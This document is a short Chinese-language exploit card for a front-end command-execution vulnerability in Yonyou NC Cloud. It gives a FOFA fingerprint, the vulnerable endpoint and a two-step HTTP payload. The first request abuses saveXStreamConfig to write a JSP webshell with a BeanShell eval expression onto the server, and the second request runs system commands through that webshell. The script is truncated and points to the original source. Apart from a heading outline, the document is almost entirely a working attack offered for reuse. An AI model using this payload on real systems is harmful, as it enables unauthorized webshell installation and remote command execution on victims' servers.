# 用友NCCloud前台命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /uapjs/jsinvoke/?action=invoke HTTP/1.1`

**请求体 / payload**
```
1. 通过poc上传webshell`823780482.jsp`
Host: xx.xx.xx.xx
Content-type: application/x-www-form-urlencoded
Content-Length: 253
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/823780482.jsp"]}
2. 通过webshell执行命令
POST /823780482.jsp?error=bsh.Interpreter HTTP/1.1
Host: xx.xx.xx.xx
Content-type: application/x-www-form-urlencoded
Content-Length: 98
cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ip…（脚本共 626 字，完整版见原文）
```

**其他**
- 用友NC Cloud前台命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC Cloud